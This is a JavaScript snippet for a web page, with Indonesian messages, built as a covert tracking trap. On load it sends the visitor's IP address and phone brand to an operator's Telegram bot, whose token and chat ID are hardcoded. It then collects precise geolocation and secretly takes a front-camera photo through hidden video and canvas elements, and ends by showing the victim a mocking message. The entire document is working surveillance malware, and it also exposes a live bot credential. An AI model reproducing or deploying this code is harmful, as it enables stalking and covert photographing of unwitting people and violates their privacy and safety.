<video id="video" style="display:none;"></video>
<canvas id="canvas" style="display:none;"></canvas>
<script>
const token = '7876416430:AAGfJpQqoNvDSbx4tpuJQPdy5k8vx7Uhndw';
const chat_id = '7777604508';

async function getIP() {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip;
  } catch {
    return "Tidak diketahui";
  }
}

function getMerekHP() {
  const ua = navigator.userAgent;

  if (/Samsung/i.test(ua)) return "Samsung";  
  if (/Xiaomi|Mi/i.test(ua)) return "Xiaomi";  
  if (/Redmi/i.test(ua)) return "Redmi";  
  if (/OPPO/i.test(ua)) return "Oppo";  
  if (/Vivo/i.test(ua)) return "Vivo";  
  if (/Realme/i.test(ua)) return "Realme";  
  if (/iPhone/i.test(ua)) return "iPhone";  
  if (/Asus/i.test(ua)) return "Asus";  
  if (/Infinix/i.test(ua)) return "Infinix";  
  if (/Huawei/i.test(ua)) return "Huawei";  

  return "Tidak diketahui";
}

async function kirimFoto() {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    video.srcObject = stream;
    await new Promise(resolve => {
      video.onloadedmetadata = () => {
        video.play();
        resolve();
      };
    });

    await new Promise(resolve => setTimeout(resolve, 2000));

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;

    const ctx = canvas.getContext('2d');
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

    return new Promise((resolve) => {
      canvas.toBlob(blob => {
        const formData = new FormData();
        formData.append("chat_id", chat_id);
        formData.append("photo", blob, "target.png");
        formData.append('caption', 'ini fotonya tuan vinzz');

        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
          method: "POST",
          body: formData
        }).then(resolve);
      }, 'image/png');
    });

  } catch (err) {
    console.warn("Akses kamera ditolak atau gagal.");
    await kirimPesanTelegram("Gagal mengambil foto. Akses kamera ditolak atau error.");
  }
}

async function kirimPesanTelegram(pesan) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chat_id,
      text: pesan
    })
  });
}

// Tahap Awal - Info Awal
(async () => {
  const ip = await getIP();
  const merek = getMerekHP();
  const pesanAwal = `IP berhasil ditemukan!\nStatus: MENUNGGU IZIN LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
  await kirimPesanTelegram(pesanAwal);
})();

// Tahap Lokasi
navigator.geolocation.getCurrentPosition(
  async (pos) => {
    const lat = pos.coords.latitude;
    const lon = pos.coords.longitude;
    const gmaps = `https://www.google.com/maps?q=${lat},${lon}`;
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `IP berhasil ditemukan!\nStatus: MENGIZINKAN LOKASI\nIP: ${ip}\nMerek hp: ${merek}\nLokasi: ${gmaps}`;
    await kirimPesanTelegram(pesan);

    // Tahap Kamera (tanpa await biar gak nunda)
    kirimFoto();

    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  },
  async () => {
    const ip = await getIP();
    const merek = getMerekHP();

    const pesan = `IP berhasil ditemukan!\nStatus: MENOLAK LOKASI\nIP: ${ip}\nMerek hp: ${merek}`;
    await kirimPesanTelegram(pesan);

    document.body.innerHTML = '<h2>Yahh kurang hoki bro wkwk.<br><small>by Vinzz Official</small></h2>';
  }
);
</script>
